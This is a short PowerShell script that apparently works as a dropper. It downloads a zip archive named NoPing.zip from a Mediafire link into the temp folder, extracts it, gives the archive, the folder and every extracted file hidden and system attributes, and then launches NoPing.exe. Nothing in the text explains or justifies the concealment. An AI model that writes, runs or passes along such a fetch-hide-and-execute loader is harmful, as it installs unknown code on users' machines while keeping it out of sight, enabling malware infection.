$zipUrl = "https://download1474.mediafire.com/9bupya8z2afgbT9E0Kp4k1aGOdhkoABxzDtRsHR0lCuJeegMax34R9AR6USpDKRl--Tm39s6fDUxpVn-MVfYSdyV8_7NJXXE8aba8apLttBQ9G2L7SxJQILsGwVDcx0vwG_Ehshd0H8Rhj1VR24skgINupHjRwkomRSNaSwgqpOsOg/27v903l90sper9s/NoPing.zip"
$exeName = "NoPing.exe"
$tempFolder = [System.IO.Path]::GetTempPath()
$zipFile = Join-Path $tempFolder "NoPing.zip"
$extractFolder = Join-Path $tempFolder "NoPing"
$exePath = Join-Path $extractFolder $exeName

# Download using curl if the file doesn't exist
if (-Not (Test-Path $zipFile)) {
    $curlPath = "C:\Windows\System32\curl.exe" # Path to curl executable
    Start-Process -FilePath $curlPath -ArgumentList "-o `"$zipFile`" `"$zipUrl`"" -Wait
    & attrib +h +s $zipFile
}

# Extract if the folder doesn't exist
if (-Not (Test-Path $extractFolder)) {
    Expand-Archive -Path $zipFile -DestinationPath $extractFolder -Force
    & attrib +h +s $extractFolder
}

# Hide all extracted files
$files = Get-ChildItem -Path $extractFolder -Recurse -File
foreach ($file in $files) {
    & attrib +h +s $file.FullName
}

# Start the executable
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath
}
